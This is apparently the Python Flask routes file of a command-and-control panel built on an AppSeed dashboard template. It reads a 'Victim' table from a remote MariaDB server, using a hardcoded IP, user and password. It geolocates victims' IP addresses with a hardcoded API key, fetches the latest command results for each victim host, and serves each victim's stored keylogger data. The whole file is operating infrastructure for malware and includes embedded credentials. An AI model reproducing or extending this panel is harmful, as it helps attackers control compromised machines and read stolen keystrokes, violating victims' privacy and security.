# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""

from apps.home import blueprint
from flask import render_template,  render_template_string, request
from flask_login import login_required
from jinja2 import TemplateNotFound

import requests
import json
import folium

import pymysql

# Fonction de connexion à la base de données
def connect_mariadb(host, user, password, database, port):
    conn = pymysql.connect(
        host=host,
        user=user,
        passwd=password,
        db=database,
        port=port
    )
    return conn
    
# Connect to the mariadb server
conn = pymysql.connect(host='170.187.191.105', user='C2server', password='putaindePEdemerde', database="server", port=3306, charset='utf8mb4', cursorclass=pymysql.cursors.DictCursor, autocommit=True)

# Authorize the autocommit
conn.autocommit(True)

@blueprint.route('/index')
@login_required
def index():

    # Create a cursor to get SQL requests
    cursor = conn.cursor()
    
    # Get creds
    cursor.execute("SELECT * FROM Victim")

    # Get results
    data = cursor.fetchall()

    # Get list of pos
    coords = []

    
    # Get each position with IP addr
    for machine in data:

        ip = machine['IP'].strip()

        print('IP : ', ip)
        
        req2 = requests.get("https://api.ipgeolocation.io/ipgeo?ip=" + ip + "&apiKey=d962fc74564c4e2083026a4c71ef306a")

        # Les données JSON
        json_data = req2.text

        # Parse data from request
        parsed_data = json.loads(json_data)

        print(parsed_data)

        # Get lat and long
        latitude = parsed_data['latitude']
        longitude = parsed_data['longitude']

        print("lat :", latitude)
        print("long :", longitude)
        
        coordonnees = (latitude, longitude)

        # Add to list
        coords.append(coordonnees)

        print("coords :",coords)
        
    # Zoom initializer
    map = folium.Map(location=[48.8566, 2.3522], zoom_start=13)

    for coord in coords:
        folium.Marker(location=[coord[0], coord[1]]).add_to(map)
    
        
    
    # Close the cursor
    
    cursor.close()
    
    # Open Map Folium
    # Création de la carte
    
    
    
    # Ajout des marqueurs à la carte

    
    
    # Conversion de la carte en HTML
    
    map_html = map._repr_html_()    


    return render_template('home/index.html', segment='index', data=data, map=map_html, len=len, range=range)

@blueprint.route('/console', methods=['GET','POST'])
@login_required    
def console():
    
    dico = ''
    
    if request.method == 'POST':
        
        conn.commit()

        resultat = request.get_json()
        # Récupérer les valeurs des variables id et name de l'URL
        hostname = resultat['hostname']
        name = resultat['name']
        
        print(name, hostname)
    
        # Cursor
        curseur = conn.cursor()


    
        # Queries
        curseur.execute("SELECT * FROM Command WHERE hostname=%s AND nom=%s ORDER BY id DESC LIMIT 1;", (hostname, name))


        # Get Results       
        resultat = curseur.fetchall()
            
        # Close the cursor
        curseur.close()

        print("Resultat : ", resultat)
        
        if resultat:
        
            # Return the result
            return resultat[0]
                          
    # Create a cursor to get SQL requests
    cursor = conn.cursor()
    
    # GET creds
    cursor.execute("SELECT * FROM Victim")

    # Get results
    data = cursor.fetchall()
    
    # Close the cursor
    cursor.close()
    
    return render_template('home/console.html', segment='console', data=data, dico=dico, len=len, range=range)


@blueprint.route('/get_keylogger/<int:id>')
@login_required
def get_keylogger(id):

    # Create a cursor to get SQL requests
    cursor = conn.cursor()

    # Query to get the keylogger value for a given id
    cursor.execute("SELECT keylogger FROM Victim WHERE id=%s", (id,))
    
    # Get the result
    result = cursor.fetchone()
    
    # Close the cursor
    cursor.close()

    print("Resultat 1 : ", result)
    print("Resultat 2 : ", result['keylogger'])

    return str(result['keylogger'])  


@blueprint.route('/<template>')
@login_required
def route_template(template):

    try:

        if not template.endswith('.html'):
            template += '.html'

        # Detect the current page
        segment = get_segment(request)

        # Serve the file (if exists) from app/templates/home/FILE.html
        return render_template("home/" + template, segment=segment)

    except TemplateNotFound:
        return render_template('home/page-404.html'), 404

    except:
        return render_template('home/page-500.html'), 500


# Helper - Extract current page name from request
def get_segment(request):

    try:

        segment = request.path.split('/')[-1]

        if segment == '':
            segment = 'index'

        return segment

    except:
        return None
